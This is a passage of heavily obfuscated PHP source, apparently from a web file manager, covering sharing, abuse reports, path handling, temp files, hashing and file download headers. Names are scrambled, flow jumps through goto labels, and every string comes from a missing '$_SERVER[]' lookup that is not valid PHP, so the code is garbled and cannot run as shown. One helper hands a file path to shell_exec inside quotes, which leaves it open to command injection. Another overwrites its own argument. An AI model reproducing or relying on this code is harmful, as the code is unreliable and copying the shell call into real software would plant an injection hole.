array($aъ[1524] => $eʥͮ, $aъ[410] => $e, $aъ[1436] => $aъ[33], $aъ[473] => 0, $aъ[475] => 0, $aъ[1072] => $aъ[33], $aъ[305] => $aъ[33], $aъ[851] => $aъ[33], $aъ[1848] => 0, $aъ[1849] => 0, $aъ[476] => 0, $aъ[477] => $aъ[33], $aъ[470] => $aъ[33]); $C = explode($aъ[47], $aъ[1850]); goto a鷄; a鷄: foreach ($C as $f) { if (!isset($a[$f])) { continue; } $Eٌɺ[$f] = $a[$f]; } $Aԗ = $this->add($Eٌɺ); $E = array($aъ[470] => short_id($Aԗ)); goto D; fܐ֨: } private function _shareAuthSet($Fž, $A׼) { goto cي; Fݾ: $a򲖡->where(array($A鹑螅[468] => $Fž))->delete(); $fꗱ = array(); foreach ($A׼ as $bڭؗ) { $B = SourceModel::TYPE_USER; if ($bڭؗ[$A鹑螅[404]] == SourceModel::TYPE_GROUP) { $B = SourceModel::TYPE_GROUP; } $B = array($A鹑螅[468] => $Fž, $A鹑螅[404] => $B, $A鹑螅[484] => intval($bڭؗ[$A鹑螅[484]]), $A鹑螅[1797] => 0, $A鹑螅[1851] => -1); if ($bڭؗ[$A鹑螅[1797]]) { $B[$A鹑螅[1797]] = $bڭؗ[$A鹑螅[1797]]; } else { if ($bڭؗ[$A鹑螅[1851]]) { $B[$A鹑螅[1851]] = $bڭؗ[$A鹑螅[1851]]; } } $fꗱ[] = $B; } goto c؆; cي: $A鹑螅 =& $_SERVER[]; if (!is_array($A׼)) { return !1; } $a򲖡 = Model($A鹑螅[1801]); goto Fݾ; c؆: return $a򲖡->addAll($fꗱ, array(), !0); goto A͆; A͆: } public function numViewAdd($D) { $A =& $_SERVER[]; $aʍΞ = array($A[467] => $D); $this->where($aʍΞ)->setAdd($A[1848]); } public function numDownloadAdd($e߸) { $C߆ =& $_SERVER[]; $E = array($C߆[467] => $e߸); $this->where($E)->setAdd($C߆[1849]); } protected function shareEdit($bǄڟ, $dݿ) { goto Dꅊ; c: foreach ($FҬ as $aญף) { if (!array_key_exists($aญף, $dݿ)) { continue; } $e藂[$aญף] = $dݿ[$aญף]; } $this->shareEventAdd($FЛ[$bѤȡ[395]], $dݿ, $bѤȡ[1669]); $this->where(array($bѤȡ[467] => $bǄڟ))->save($e藂); goto b; b: if (isset($dݿ[$bѤȡ[1841]])) { $this->_shareAuthSet($bǄڟ, $dݿ[$bѤȡ[1841]]); } return !0; goto E̸; Aðʅ: $this->_checkLinkShare($dݿ, $FЛ); $e藂 = array(); $FҬ = explode($bѤȡ[47], $bѤȡ[1852]); goto c; Dꅊ: $bѤȡ =& $_SERVER[]; $FЛ = $this->getInfo($bǄڟ); if (!$FЛ) { return !1; } goto Aðʅ; E̸: } private function _checkLinkShare($A, $bڎ) { goto Cα٪; f˲: if ($bڎ[$F٫[85]][$F٫[29]] != $F٫[193]) { $aٜ = $this->_folderReport($aԘ); if (!$aٜ) { return; } show_json(LNG($F٫[1853]) . $F٫[1854] . $aٜ, !1); } $eߦ = Model($F٫[795])->fileInfoGet($bڎ[$F٫[85]][$F٫[395]]); if (!$eߦ) { return; } goto b; Cα٪: $F٫ =& $_SERVER[]; if ($A[$F٫[473]] != $F٫[87]) { return; } $aԘ = $bڎ[$F٫[85]][$F٫[395]]; goto f˲; b: $E = $this->shareFileMeta($eߦ[$F٫[447]]); if (isset($E[$F٫[372]]) && $E[$F٫[372]] == $F٫[87]) { show_json(LNG($F٫[1855]), !1); } goto A␒; A␒: } private function _folderReport($D) { goto d擃; C: $d۳ = array_to_keyvalue($B޻, $f쇎[33], $f쇎[28]); $d۳[] = $Fپ[$f쇎[28]]; return implode($f쇎[8], $d۳); goto Cꝵ; Dĝᎇ: if (!$bߴ) { return !1; } $bߴ = array_to_keyvalue($bߴ, $f쇎[33], $f쇎[447]); $FϞ = $f쇎[47] . $D . $f쇎[47]; goto A; A: $bŴɩ = array($f쇎[447] => array($f쇎[7], $bߴ), $f쇎[502] => array($f쇎[380], "\45{$FϞ}\45"), $f쇎[423] => 0); $Fپ = Model($f쇎[795])->where($bŴɩ)->field($f쇎[1857])->find(); if (!$Fپ) { return !1; } goto E; E: $C͙ = substr($Fپ[$f쇎[502]], strpos($Fپ[$f쇎[502]], $FϞ)); $bŴɩ = array($f쇎[395] => array($f쇎[7], trim($C͙, $f쇎[47]))); $B޻ = Model($f쇎[795])->where($bŴɩ)->field($f쇎[28])->select(); goto C; d擃: $f쇎 =& $_SERVER[]; $bŴɩ = array($f쇎[447] => array($f쇎[971], 0), $f쇎[715] => 3); $bߴ = Model($f쇎[1856])->where($bŴɩ)->field($f쇎[447])->select(); goto Dĝᎇ; Cꝵ: } protected function remove($F) { goto Aۓ; Aۓ: $d٥ =& $_SERVER[]; if (is_array($F)) { $F = array($d٥[7], $F); } $FꔨӕӰ = array($d٥[468] => $F); goto aͅ; Aӑ: for ($dŔ = 0; $dŔ < count($D톕ә); $dŔ++) { $E = $this->getInfo($D톕ә[$dŔ]); if ($E[$d٥[475]] == $d٥[87]) { Model($d٥[546])->eventShare($E[$d٥[395]], $d٥[1846]); } if ($E[$d٥[473]] == $d٥[87]) { Model($d٥[546])->eventShare($E[$d٥[395]], $d٥[1845]); } } return $aɢք; goto AӍ; aͅ: $aɢք = $this->where($FꔨӕӰ)->delete(); if ($aɢք) { Model($d٥[577])->where(array($d٥[468] => $F))->delete(); } $D톕ә = is_array($F) ? $F[1] : array($F); goto Aӑ; AӍ: } protected function removeBySource($aŃ) { goto F; BΫ: $this->where($b㬮)->delete(); Model($b쏽[577])->where($b㬮)->delete(); goto E; cۯ狗: $B = array_to_keyvalue($B, $b쏽[33], $b쏽[468]); if (!$B) { return; } $b㬮 = array($b쏽[467] => array($b쏽[411], $B)); goto BΫ; F: $b쏽 =& $_SERVER[]; $b㬮 = array($b쏽[410] => array($b쏽[411], $aŃ)); $B = $this->field($b쏽[468])->where($b㬮)->select(); goto cۯ狗; E: } public function listAll($a̦ۑǢ) { goto bԆ; D: return $D; goto f; bԆ: $bԍ =& $_SERVER[]; $Cś = array(); if ($a̦ۑǢ[$bԍ[1533]]) { $Cś[$bԍ[1533]] = $a̦ۑǢ[$bԍ[1533]]; } goto F邙; F邙: if ($a̦ۑǢ[$bԍ[726]]) { $E = $a̦ۑǢ[$bԍ[476]] ? $a̦ۑǢ[$bԍ[476]] : strtotime(date($bԍ[1858])); $Cś[$bԍ[194]] = array($bԍ[331], array($a̦ۑǢ[$bԍ[726]], $E)); } if ($a̦ۑǢ[$bԍ[29]]) { $Cś[$a̦ۑǢ[$bԍ[29]]] = 1; } else { $Cś[] = array($bԍ[473] => array($bԍ[971], 0), $bԍ[475] => array($bԍ[971], 0), $bԍ[1835] => $bԍ[1789]); } if ($a̦ۑǢ[$bԍ[1785]]) { $Cś[] = array($bԍ[470] => $a̦ۑǢ[$bԍ[1785]], $bԍ[1436] => array($bԍ[380], "\x25{$a̦ۑǢ[$bԍ[1785]]}\x25"), $bԍ[1835] => $bԍ[1789]); } goto a; a: $D = $this->_makeOrder()->where($Cś)->selectPage(20); if (empty($D[$bԍ[367]])) { return array(); } $this->_listDataApply($D[$bԍ[367]]); goto D; f: } public function listDataApply($aݰ̗) { $this->_listDataApply($aݰ̗); return $aݰ̗; } private function _listDataApply(&$cĻ謱) { goto E͎; a: $F = array_to_keyvalue($cĻ謱, $A[33], $A[395]); $bʾڜ = Model($A[795])->sourceListInfo($F, !0); foreach ($cĻ謱 as $b뛌 => &$b˓Ӈ̑) { $B = $b˓Ӈ̑[$A[1533]]; $b˓Ӈ̑[$A[1859]] = $EݥӒ[$B] ? $EݥӒ[$B] : !1; $dﳙ = $b˓Ӈ̑[$A[395]]; $b˓Ӈ̑[$A[85]] = $bʾڜ[$dﳙ] ? $bʾڜ[$dﳙ] : !1; if ($b˓Ӈ̑[$A[85]][$A[423]] == $A[87]) { unset($cĻ謱[$b뛌]); } if ($b˓Ӈ̑[$A[85]] != $A[191] && !$b˓Ӈ̑[$A[85]]) { unset($cĻ謱[$b뛌]); } } goto f䯐; E͎: $A =& $_SERVER[]; $Dה = array_to_keyvalue($cĻ謱, $A[33], $A[1533]); $EݥӒ = Model($A[519])->userListInfo(array_unique($Dה)); goto a; f䯐: unset($b˓Ӈ̑); $cĻ謱 = array_values($cĻ謱); goto aș; aș: } private function _makeOrder($bØ = '') { goto DŌ; Bۓ: $Fޙ = Input::get($C[435], $C[7], $C[416], $C̤Ք); $c쟰 = Input::get($C[436], $C[7], $C[1860], array($C[1784], $C[430])); $c쟰 = $eߦ[$c쟰]; goto fԏᄻ; fԏᄻ: $bØ = $bØ . "{$Fޙ}\40{$c쟰}"; return $this->order($bØ); goto c伒; DŌ: $C =& $_SERVER[]; $C̤Ք = array($C[194], $C[476], $C[1848], $C[1849]); $eߦ = array($C[428] => $C[429], $C[430] => $C[431]); goto Bۓ; c伒: } public function reportAdd($fҫ) { $Fٍ͢ =& $_SERVER[]; $d͙֨ = array($Fٍ͢[468] => $fҫ[$Fٍ͢[468]], $Fٍ͢[1533] => USER_ID); if (Model($Fٍ͢[1856])->where($d͙֨)->find()) { return !1; } $eʤ = array($Fٍ͢[468] => $fҫ[$Fٍ͢[468]], $Fٍ͢[1436] => $fҫ[$Fٍ͢[1436]], $Fٍ͢[395] => $fҫ[$Fٍ͢[395]], $Fٍ͢[447] => $fҫ[$Fٍ͢[447]], $Fٍ͢[1533] => USER_ID, $Fٍ͢[29] => $fҫ[$Fٍ͢[29]], $Fٍ͢[431] => $fҫ[$Fٍ͢[431]]); return Model($Fٍ͢[1856])->add($eʤ); } public function reportList($BЋ껨) { goto c򬮣; c򬮣: $b =& $_SERVER[]; $C͋؂ = array(); if ($BЋ껨[$b[726]]) { $B褧ӫ = $BЋ껨[$b[476]] ? $BЋ껨[$b[476]] : strtotime(date($b[1858])); $C͋؂[$b[194]] = array($b[331], array($BЋ껨[$b[726]], $B褧ӫ)); } goto D皐; bڳ: if (empty($cӄ[$b[367]])) { return array(); } $f = array_to_keyvalue_group($cӄ[$b[367]], $b[715], $b[468]); if (!empty($f[0])) { $BЋ껨 = $f[0]; $C͋؂ = array($b[468] => array($b[7], $BЋ껨)); $D = $this->where($C͋؂)->field($b[468])->select(); $D = array_to_keyvalue($D, $b[33], $b[468]); $dܷ = array_diff($BЋ껨, $D); if (!empty($dܷ)) { foreach ($cӄ[$b[367]] as $aɇ => $E瑙) { if (in_array($E瑙[$b[468]], $dܷ)) { unset($cӄ[$b[367]][$aɇ]); } } } } goto cυ; D皐: if (isset($BЋ껨[$b[29]]) && in_array($BЋ껨[$b[29]], array($b[87], $b[1861], $b[1862], $b[1863], $b[1864]))) { $C͋؂[$b[29]] = $BЋ껨[$b[29]]; } if (isset($BЋ껨[$b[715]]) && in_array($BЋ껨[$b[715]], array($b[191], $b[87], $b[1861], $b[1862]))) { $C͋؂[$b[715]] = $BЋ껨[$b[715]]; } $bˌ = Input::get($b[436], $b[7], $b[1860], array($b[1784], $b[430])); goto f; cυ: $this->_listDataApply($cӄ[$b[367]]); return $cӄ; goto cذȈ; f: $A߅ = array($b[428] => $b[429], $b[430] => $b[431]); $B⒑ = $b[1865] . $A߅[$bˌ]; $cӄ = Model($b[1856])->where($C͋؂)->order($B⒑)->selectPage(20); goto bڳ; cذȈ: } public function reportStatus($A) { goto a; b: if (!$C) { return !1; } $C = array($fͥ[715] => $A[$fͥ[715]]); if ($A[$fͥ[715]] == $fͥ[1862] && $C[$fͥ[715]] == $fͥ[1862]) { $C[$fͥ[715]] = 0; } goto c̍; c̍: $EН = Model($fͥ[1856])->where($Dۉז)->save($C); if ($A[$fͥ[715]] == $fͥ[1861]) { if ($C[$fͥ[447]] != $fͥ[191] && $this->shareFileMeta($C[$fͥ[447]])) { $this->shareFileMeta($C[$fͥ[447]], 0); } $this->remove($C[$fͥ[468]]); return !0; } if ($EН && $A[$fͥ[715]] == $fͥ[1862]) { $DΊ = $C[$fͥ[715]] == $fͥ[1862] ? 1 : 0; $this->shareFileMeta($C[$fͥ[447]], $DΊ); $this->removeByFile($C[$fͥ[447]]); } goto C; a: $fͥ =& $_SERVER[]; $Dۉז = array($fͥ[393] => $A[$fͥ[393]]); $C = Model($fͥ[1856])->where($Dۉז)->field($fͥ[1866])->find(); goto b; C: return $EН; goto A; A: } private function removeByFile($eڤ) { goto Cތ; aј: $e­ = array($AԢ[395] => array($AԢ[7], $e), $AԢ[473] => 1); $Fܤ = $this->where($e­)->field($AԢ[468])->select(); if (empty($Fܤ)) { return; } goto D; D: $A֍ = array_to_keyvalue($Fܤ, $AԢ[33], $AԢ[468]); $this->remove($A֍); goto eÝ; Cތ: $AԢ =& $_SERVER[]; $Fܤ = Model($AԢ[795])->where(array($AԢ[447] => $eڤ))->field($AԢ[395])->select(); $e = array_to_keyvalue($Fܤ, $AԢ[33], $AԢ[395]); goto aј; eÝ: } private function shareFileMeta($e, $Dͅ = null) { $E =& $_SERVER[]; $Cͼǌ = array($E[447] => $e, $E[93] => $E[1867]); if (is_null($Dͅ)) { return Model($E[1868])->where($Cͼǌ)->find(); } $Cͼǌ[$E[372]] = $Dͅ; Model($E[1868])->add($Cͼǌ, array(), !0); } } goto E; dɼ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $F눻 =& $_SERVER[]; $this->objectDriver = array($F눻[57], $F눻[58], $F눻[59], $F눻[60], $F눻[61], $F눻[62], $F눻[63], $F눻[64], $F눻[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($d) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($d, $_SERVER[][8]); } return $d; } public function iconvApp($c) { return $c; } public function iconvSystem($C) { return $C; } public function iconvTo($bۄȚ, $c筻, $A瞝) { goto eɱ; eɱ: $bԛϑ =& $_SERVER[]; if (!$bۄȚ || !function_exists($bԛϑ[66])) { return $bۄȚ; } static $Cη = array(); goto F; Dۏ: $cԐ = $cԐ ? $cԐ : $bۄȚ; if (strstr($cԐ, $bԛϑ[70])) { $cԐ = str_replace($bԛϑ[70], $bԛϑ[71], $cԐ); } $Cη[$c筻 . $bԛϑ[67] . $A瞝 . $bԛϑ[68] . $bۄȚ] = $cԐ; goto C귏ֹ; e: return $cԐ; goto f; C귏ֹ: $Cη[$A瞝 . $bԛϑ[67] . $c筻 . $bԛϑ[68] . $bۄȚ] = $bۄȚ; $Cη[$A瞝 . $bԛϑ[67] . $c筻 . $bԛϑ[68] . $cԐ] = $bۄȚ; $Cη[$c筻 . $bԛϑ[67] . $A瞝 . $bԛϑ[68] . $cԐ] = $cԐ; goto e; F: $Eݫ = $c筻 . $bԛϑ[67] . $A瞝 . $bԛϑ[68] . $bۄȚ; if (isset($Cη[$Eݫ])) { return $Cη[$Eݫ]; } if (function_exists($bԛϑ[69])) { $cԐ = @mb_convert_encoding($bۄȚ, $A瞝, $c筻); } else { $cԐ = @iconv($c筻, $A瞝, $bۄȚ); } goto Dۏ; f: } public function getPathInner($FŻձ) { $E = IO::init($FŻձ); return $E->path; } public function getPathOuter($f漰) { $e܃ =& $_SERVER[]; $f𙙽 = strlen(trim($this->pathBase, $e܃[8])); $f漰 = substr(trim($f漰, $e܃[8]), $f𙙽); return $this->pathDriver . $e܃[8] . ltrim($f漰, $e܃[8]); } public function isParentOf($Cꎃ, $b) { $b =& $_SERVER[]; $Cꎃ = rtrim(strtolower($Cꎃ), $b[8]) . $b[8]; $b = rtrim(strtolower($b), $b[8]) . $b[8]; $D = strpos($b, $Cꎃ) === 0; return $D; } public function getType() { $e =& $_SERVER[]; $C = str_replace($e[72], $e[33], get_class($this)); return strtolower($C); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($fՏ, $cЈ) { $fژ鷇 =& $_SERVER[]; $aɡ = rtrim($fՏ, $fژ鷇[8]) . $fژ鷇[8] . $cЈ; $C촘 = $this->exist($aɡ); return $C촘 ? $aɡ : !1; } public function setModifyTime($f, $BלӍ = '') { } public function renameObject($FȨ, $F񗜔) { goto c; a: $FȨ = $this->getPathOuter($FȨ); $F񗜔 = $this->pathFather($FȨ) . $F񗜔; if (IO::isFile($FȨ)) { $Dߧ = IO::copy($FȨ, $this->pathFather($FȨ), REPEAT_RENAME_FOLDER, $B); if ($Dߧ) { IO::remove($FȨ); } } else { $Dߧ = IO::mkdir($F񗜔); if (!$Dߧ) { return !1; } $c = IO::listPath($FȨ, !0); $c = array_merge($c[$Bپ[74]], $c[$Bپ[75]]); foreach ($c as $c⒒) { IO::move($c⒒[$Bپ[76]], $F񗜔, REPEAT_RENAME_FOLDER); } IO::remove($FȨ); } goto f¼; c: $Bپ =& $_SERVER[]; $B = $F񗜔; Hook::trigger($Bپ[73], $this, $FȨ, $this, $this->pathFather($FȨ) . $F񗜔); goto a; f¼: return $Dߧ ? $F񗜔 : !1; goto F݄; F݄: } public function tempFile($Aɂ = '', $D՚ = '') { goto Aԧ; Aֶ: return $A; goto AÅ; b霃߆: $A = $cѸν . $Aɂ; @touch($A); if ($D՚) { file_put_contents($A, $D՚); } goto Aֶ; Aԧ: if (!$Aɂ) { $Aɂ = rand_string(15); } $cѸν = TEMP_FILES . rand_string(15) . $_SERVER[][8]; @mkdir($cѸν, 511, !0); goto b霃߆; AÅ: } public function tempFileRemve($a⮢) { @unlink($a⮢); @rmdir($this->pathFather($a⮢)); } public function mkfile($b҉Ś, $B = '', $E̅ӳ = REPEAT_RENAME) { } public function mkdir($eƃ, $bڮ = REPEAT_SKIP) { } public function delFile($d) { } public function delFolder($aʖ) { } public function copyFile($F꘽, $d) { } public function moveFile($f, $B㱅ϭ) { } public function remove($A) { if ($this->isFile($A)) { return $this->delFile($A); } return $this->delFolder($A); } public function rename($A, $e𭒈) { } public function exist($f) { } public function findByHash($eϔ = '', $e = '') { return !1; } public function isFile($fΑ) { } public function isFolder($F) { } public function size($dɹȞ) { } public function info($f׎) { } public function infoSimple($f) { return $this->info($f); } public function infoAuth($cԉµ) { return $this->info($cԉµ); } public function infoFull($F) { return $this->info($F); } public function infoWithChildren($FۜҐ) { $F඙ =& $_SERVER[]; static $B񪊃 = array(); if (isset($B񪊃[$FۜҐ])) { return $B񪊃[$FۜҐ]; } $f򓲪 = $this->info($FۜҐ); if ($f򓲪 && $f򓲪[$F඙[29]] == $F඙[77]) { $Bᒰ = array($F඙[78] => 0, $F඙[79] => 0, $F඙[80] => 0); $this->infoChildren($FۜҐ, $Bᒰ); $f򓲪[$F඙[78]] = $Bᒰ[$F඙[78]]; $f򓲪[$F඙[81]] = array($F඙[82] => $Bᒰ[$F඙[79]], $F඙[83] => $Bᒰ[$F඙[80]]); $B񪊃[$FۜҐ] = $f򓲪; } return $f򓲪; } public function listPath($cȖ, $a˺ = false) { } public function has($eǙ, $B = false, $FӺ = false) { } public function canRead($EЛΓߏ) { } public function canWrite($e) { } public function getContent($A) { } public function setContent($B, $E╷ډ = '') { } protected function infoChildren($Dɧ, &$e) { $Fگ =& $_SERVER[]; check_abort_echo(); $b˺Ԍ = $this->listPath($Dɧ, !0); $b˺Ԍ = array_merge($b˺Ԍ[$Fگ[75]], $b˺Ԍ[$Fگ[74]]); foreach ($b˺Ԍ as $fǈ) { if ($fǈ[$Fگ[29]] == $Fگ[77]) { $e[$Fگ[80]]++; $D = $this->getPathInner($fǈ[$Fگ[76]]); $this->infoChildren($D, $e); } else { $e[$Fگ[79]]++; $e[$Fگ[78]] += $fǈ[$Fگ[78]]; } } } public function fileSubstr($bǩ, $c, $Aﾨа) { } public function listAll($Aþ) { } public function listAllMake($b, &$Fʗ) { $cˍ =& $_SERVER[]; check_abort_echo(); $cÐ = $this->listPath($b, !0); if (!$cÐ) { return; } $cܠ₏ = array_merge($cÐ[$cˍ[75]], $cÐ[$cˍ[74]]); foreach ($cܠ₏ as $b) { goto CӨ; CӇ: $this->listAllMake($b[$cˍ[76]], $Fʗ); goto d҄; F: if (isset($b[$cˍ[84]])) { $bِ[$cˍ[84]] = $b[$cˍ[84]]; } if (!$e) { $Fʗ[] = $bِ; continue; } $Fʗ[] = $bِ; goto CӇ; CӨ: $e = $b[$cˍ[29]] == $cˍ[77]; $bِ = array($cˍ[76] => $b[$cˍ[76]], $cˍ[77] => $e); if (isset($b[$cˍ[78]])) { $bِ[$cˍ[78]] = $b[$cˍ[78]]; } goto F; d҄: } } public function listAllSimple($fƹ) { $fֹ =& $_SERVER[]; $F = array(); $Fû = $this->listAll($fƹ); $a穽 = $this->getPathOuter($fƹ); foreach ($Fû as $F) { goto a߼; a屒: if (!$F[$fֹ[77]]) { $e㉌[$fֹ[86]] = $c招; } $F[] = $e㉌; goto eӤ; a߼: $c招 = $F[$fֹ[76]]; $dص = $F[$fֹ[76]]; if (isset($F[$fֹ[85]])) { $c招 = $F[$fֹ[85]][$fֹ[76]]; $F[$fֹ[78]] = $F[$fֹ[85]][$fֹ[78]]; $F[$fֹ[84]] = $F[$fֹ[85]][$fֹ[84]]; } else { $dص = substr($F[$fֹ[76]], strlen(get_path_father($a穽))); $dص = $fֹ[8] . ltrim($dص, $fֹ[8]); } goto e҃Ք; e҃Ք: $e㉌ = array($fֹ[76] => $dص, $fֹ[77] => $F[$fֹ[77]]); if (isset($F[$fֹ[78]]) && !$F[$fֹ[77]]) { $e㉌[$fֹ[78]] = $F[$fֹ[78]]; } if (isset($F[$fֹ[84]])) { $e㉌[$fֹ[84]] = $F[$fֹ[84]]; } goto a屒; eӤ: } return $F; } public function upload($a漳ى, $d̐, $dω = false, $Dԗ = REPEAT_REPLACE) { } public function uploadFileByID($Eא, $fЈ, $e) { } public function uploadFileByPath($Aㆋ, $A, $Cꎩ = array()) { } public function isUploadServer() { $C՚ =& $_SERVER[]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $C՚[87]) { return !0; } return $GLOBALS[$C՚[6]][$C՚[88]][$C՚[89]]; } public function isFileOutServer() { $E޻ =& $_SERVER[]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $E޻[87]) { return !0; } return $GLOBALS[$E޻[6]][$E޻[88]][$E޻[90]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($Dⶻ) { $Dˣ =& $_SERVER[]; if (!$this->isCdnHost()) { return $Dⶻ; } return str_replace(trim(get_url_root($Dⶻ), $Dˣ[8]), trim($this->cdnHost, $Dˣ[8]), $Dⶻ); } public function uploadLink($e։, $B酟˕ = 0) { goto EƐ; e֛ԑ: if ($A᧴©) { $A᧴©[$A˙ς[93]] = $e։; $A᧴©[$A˙ς[94]] = $aĄ; } return $A᧴©; goto a؏; EƐ: $A˙ς =& $_SERVER[]; if ($this->isUploadServer()) { return; } $aĄ = $this->getType(); goto F; e·: $A = $B酟˕ <= $c㆞ ? $A˙ς[91] : $A˙ς[92]; $aϣ頑 = (!$B酟˕ ? 1 : ceil($B酟˕ / pow(1024, 3))) * 3600 * 4; $A᧴© = $this->{$A}($e։, $aϣ頑); goto e֛ԑ; F: if (!in_array($aĄ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $c㆞ = 1024 * 1024 * 10; goto e·; a؏: } public function uploadFormData($a߭߿, $A۷ = 3600) { } public function multiUploadFormData($b, $fحڸ = 3600) { } public function download($f, $BƆщ) { } public function ext($B) { $b =& $_SERVER[]; if (strpos($B, $b[8]) === -1) { $dޠ = $B; } else { $dޠ = $this->pathThis($B); } $cᆈƏ = $b[33]; if (strstr($dޠ, $b[95])) { $cᆈƏ = substr($dޠ, strrpos($dޠ, $b[95]) + 1); $cᆈƏ = strtolower($cᆈƏ); } if (strlen($cᆈƏ) > 3 && preg_match($b[96], $cᆈƏ, $Cۖ䟉)) { $cᆈƏ = $b[33]; } return $cᆈƏ; } public function pathThis($C݅Ʃ) { $e돮 =& $_SERVER[]; $C݅Ʃ = str_replace($e돮[97], $e돮[8], rtrim($C݅Ʃ, $e돮[8])); $AԷ = strrpos($C݅Ʃ, $e돮[8]); if ($AԷ === !1) { return $C݅Ʃ; } return substr($C݅Ʃ, $AԷ + 1); } public function pathFather($fˇڷ) { $aӿ =& $_SERVER[]; $fˇڷ = str_replace($aӿ[97], $aӿ[8], rtrim($fˇڷ, $aӿ[8])); $dɊ = strrpos($fˇڷ, $aӿ[8]); if ($dɊ === !1) { return $aӿ[33]; } return substr($fˇڷ, 0, $dɊ + 1); } public function hashSimple($C蓛) { goto f؉; A˂: $a = 200; $F = 50; if ($E <= $a * $F) { return $this->hashMd5($C蓛) . $E; } goto AϷ; b: $f .= $this->fileSubstr($C蓛, $E - $a, $a); return md5($f) . $E; goto F˵ǵ; AϷ: $D̅ = intval($E / $F); $f = $f몬[33]; for ($CĚ = 0; $CĚ < $F; $CĚ++) { $f .= $this->fileSubstr($C蓛, $D̅ * $CĚ, $a); } goto b; f؉: $f몬 =& $_SERVER[]; if (!$C蓛) { return md5($f몬[33]); } $E = $this->size($C蓛); goto A˂; F˵ǵ: } public static $md5Cache = array(); public function hashMd5($e) { $e = $this->iconvSystem($e); if (isset(self::$md5Cache[$e])) { return self::$md5Cache[$e]; } self::$md5Cache[$e] = $this->hashMd5Shell($e); if (!self::$md5Cache[$e]) { self::$md5Cache[$e] = @md5_file($e); } return self::$md5Cache[$e]; } private function hashMd5Shell($A˘̒) { goto aݷ۬; Cى: $eëྲྀ = shell_exec($EƼ . "\x20\x22{$A˘̒}\42"); $eëྲྀ = str_replace($bͅ[104], $bͅ[33], $eëྲྀ); return substr($eëྲྀ, 0, 32); goto D˴é; f: $EƼ = Cache::get($bͅ[101]); if (!$EƼ) { $f؈ = BASIC_PATH . $bͅ[102]; $f = md5_file($f؈); $EƼ = $bͅ[103]; foreach ($cݬ as $cݬҢ) { $eëྲྀ = shell_exec($cݬҢ . "\x20\x22{$f؈}\42"); if ($eëྲྀ && substr(trim($eëྲྀ), 0, 32) == $f) { $EƼ = $cݬҢ; break; } } Cache::set($bͅ[101], $EƼ, 3600); } if ($EƼ == $bͅ[103]) { return !1; } goto Cى; aݷ۬: $bͅ =& $_SERVER[]; if (!function_exists($bͅ[98])) { return !1; } $cݬ = array($bͅ[99], $bͅ[100]); goto f; D˴é: } public function link($aꛎ) { return $aꛎ; } public function fileOut($d, $eʲ = false, $Bң = false, $eВ = '') { goto D; Cǲ: if (in_array($eϑ, array($F򍜼[111], $F򍜼[112], $F򍜼[113], $F򍜼[114]))) { $eϑ = $F򍜼[115]; } if (!$eВ) { $eВ = md5($bՌÉ . $this->hashSimple($d)); } $eВ = $F򍜼[116] . $eВ . $F򍜼[116]; goto B; B: $dΠ = get_file_mime($eϑ); if (strstr($dΠ, $F򍜼[117])) { $dΠ = $dΠ . $F򍜼[118]; } if ($eʲ === !1 && !mime_support($dΠ)) { $eʲ = !0; $dΠ = $F򍜼[119]; } goto Eۋ; Eۋ: header($F򍜼[120]); header($F򍜼[121] . $dΠ); $eǼ = rawurlencode($C斿); goto DĿ; Cҋ: header($F򍜼[135] . $bՌÉ . $F򍜼[127]); header($F򍜼[136] . $C斿); header($F򍜼[137]); goto f𓣵; c: if ($_SERVER[$F򍜼[157]] == $F򍜼[158]) { return; } $C㪪 = 1024 * 100; $dڿ = 0; goto D̃; eᤔ: header($F򍜼[128]); header($F򍜼[129]); header($F򍜼[130]); goto e; F: @ob_end_clean(); set_timeout(); $Dགྷى = $this->infoFull($d); goto b׊; DĿ: $eǼ = $F򍜼[116] . $eǼ . $F򍜼[122] . $eǼ; if ($eʲ) { header($F򍜼[123]); header($F򍜼[124] . $eǼ); } else { header($F򍜼[125] . $eǼ); } header($F򍜼[126] . gmdate($F򍜼[110], time() + 3600 * 24 * 30) . $F򍜼[127]); goto eᤔ; D̃: if ($a) { $dڿ = intval(1000 * 1000 * ($C㪪 / $a)); } while ($D <= $bÖ) { $E٬ = timeFloat(); check_abort(); $Fі = $bÖ - $D + 1; if ($Fі <= $C㪪) { $C㪪 = $Fі; } echo $this->fileSubstr($d, $D, $C㪪); $D += $C㪪; if ($C㪪 == $Fі) { $D = $bÖ + 1; } if ($dڿ) { $e = intval(1000 * 1000 * (timeFloat() - $E٬)); $CÒ = $dڿ - $e; if ($CÒ > 5) { usleep($CÒ); } } } goto c񩍛; Fń: $d = strtolower($_SERVER[$F򍜼[142]]); if ($B && $d && $CՍ) { if (strstr($d, $F򍜼[143])) { header($F򍜼[144] . $d); } else { if (strstr($d, $F򍜼[145])) { header($F򍜼[146] . $d); } else { if (strstr($d, $F򍜼[147])) { header($F򍜼[148] . $d); } } } if ($a) { header($F򍜼[149] . $a); } return; } if (isset($_SERVER[$F򍜼[150]])) { if (preg_match($F򍜼[151], $_SERVER[$F򍜼[150]], $f)) { $D = intval($f[1]); if (!empty($f[2])) { $bÖ = intval($f[2]); } } header($F򍜼[152]); header("\103\x6f\x6e\x74\145\x6e\x74\55\x52\x61\x6e\147\145\x3a\x20\x62\x79\x74\x65\163\40{$D}\55{$bÖ}\57" . $f); } else { header($F򍜼[153]); } goto aќ; aќ: $d张ޛ = !0; if ($_SERVER[$F򍜼[154]] == $F򍜼[155] && $f > 1204 * 1024 * 1024 * 2) { $d张ޛ = !1; } if ($d张ޛ) { header($F򍜼[156] . ($bÖ - $D + 1)); } goto c; D: $F򍜼 =& $_SERVER[]; $this->cacheMethod(null, null); if (!$d || !$this->exist($d)) { show_json(LNG($F򍜼[105]), !1, $Bң); } goto fŚ̌; e: if (isset($_SERVER[$F򍜼[131]]) && strtotime($_SERVER[$F򍜼[131]]) == $Dགྷى[$F򍜼[84]]) { header($F򍜼[132], !0, 304); die; } if (isset($_SERVER[$F򍜼[133]]) && $_SERVER[$F򍜼[133]] == $eВ) { header($F򍜼[134] . $eВ, !0, 304); die; } 